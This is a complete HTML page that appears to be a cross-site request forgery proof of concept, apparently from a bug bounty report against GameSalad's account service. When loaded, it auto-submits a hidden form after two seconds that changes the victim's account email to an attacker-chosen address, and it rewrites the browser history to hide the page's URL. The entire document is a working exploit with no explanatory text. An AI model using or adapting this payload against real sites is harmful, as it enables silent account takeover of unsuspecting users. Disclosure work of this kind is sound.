<html>
   <body onload="setTimeout(function() { document.exploit.submit() }, 2000)">
   <script>history. pushState('', '', '/')</script>
 	<form action="https://auth.gamesalad.com/account/settings.json" method="POST" name="exploit">
   	<input type="hidden" name="game&#95;salad&#95;user&#91;email&#95;address&#93;" value="saifedeen&#43;1&#64;wearehackerone&#46;com" />
   	<input type="submit" value="Submit request" hidden/>
 	</form>
   </body>
</html>